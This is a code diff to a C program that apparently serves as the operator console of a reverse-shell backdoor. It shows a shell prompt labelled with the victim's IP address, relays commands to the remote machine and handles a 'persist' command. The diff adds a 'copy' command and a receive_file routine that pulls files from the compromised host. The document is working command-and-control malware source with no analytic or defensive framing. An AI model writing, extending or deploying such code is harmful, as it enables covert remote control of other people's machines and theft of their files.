@@ -6,7 +6,55 @@
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <stdint.h>
 
+#define BUFFER_SIZE 8192
+
+void receive_file(int client_socket) {
+    uint32_t nameLen;
+    uint64_t filesize;
+    char filename[1024];
+    char buffer[BUFFER_SIZE];
+    FILE *file;
+    uint64_t total = 0;
+    int bytes_received;
+    
+    if (recv(client_socket, &nameLen, sizeof(nameLen), 0) <= 0) return;
+    if (nameLen >= 1024) return;
+    
+    memset(filename, 0, sizeof(filename));
+    if (recv(client_socket, filename, nameLen, 0) <= 0) return;
+    
+    if (recv(client_socket, &filesize, sizeof(filesize), 0) <= 0) return;
+    
+    printf("receiving the file: %s (%llu bytes)\n", filename, (unsigned long long)filesize);
+    
+    file = fopen(filename, "wb");
+    if (file == NULL) {
+        printf("Erro to create file %s\n", filename);
+        return;
+    }
+    
+    while (total < filesize) {
+        int want = BUFFER_SIZE;
+        if (filesize - total < BUFFER_SIZE)
+            want = (int)(filesize - total);
+        
+        bytes_received = recv(client_socket, buffer, want, 0);
+        if (bytes_received <= 0) break;
+        
+        fwrite(buffer, 1, bytes_received, file);
+        total += bytes_received;
+    }
+    
+    fclose(file);
+    
+    if (total == filesize) {
+        printf("file %s received! (%llu bytes)\n", filename, (unsigned long long)total);
+    } else {
+        printf("Erro: incomplete file (%llu/%llu bytes)\n", (unsigned long long)total, (unsigned long long)filesize);
+    }
+}
 
 int main()
 {
@@ -14,7 +62,6 @@ int main()
 	char buffer[1024];
 	char response[18384];
 	struct sockaddr_in server_address, client_address;
-	int i=0;
 	int optval = 1;
 	socklen_t client_length;
 
@@ -36,28 +83,31 @@ int main()
 
 	while(1)
 	{
-		jump:
 		bzero(&buffer, sizeof(buffer));
 		bzero(&response, sizeof(response));
 		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
 		fgets(buffer, sizeof(buffer), stdin);
 		strtok(buffer, "\n");
-		write(client_socket, buffer, sizeof(buffer));
+		send(client_socket, buffer, strlen(buffer), 0);
+		
 		if (strncmp("q", buffer, 1) == 0) {
 			break;
 		}
 		else if (strncmp("cd ", buffer, 3) == 0) {
-			goto jump;
+			recv(client_socket, response, sizeof(response), 0);
 		}
 		else if (strncmp("persist", buffer, 7) == 0) {
 			recv(client_socket, response, sizeof(response), 0);
 			printf("%s", response);
 		}
-		else {
-			recv(client_socket, response, sizeof(response), MSG_WAITALL);
+		else if (strncmp("copy ", buffer, 5) == 0) {
+			receive_file(client_socket);
+			recv(client_socket, response, sizeof(response), 0);
 			printf("%s", response);
 		}
-
+		else {
+			recv(client_socket, response, sizeof(response), 0);
+			printf("%s", response);
+		}
 	}
-
 }
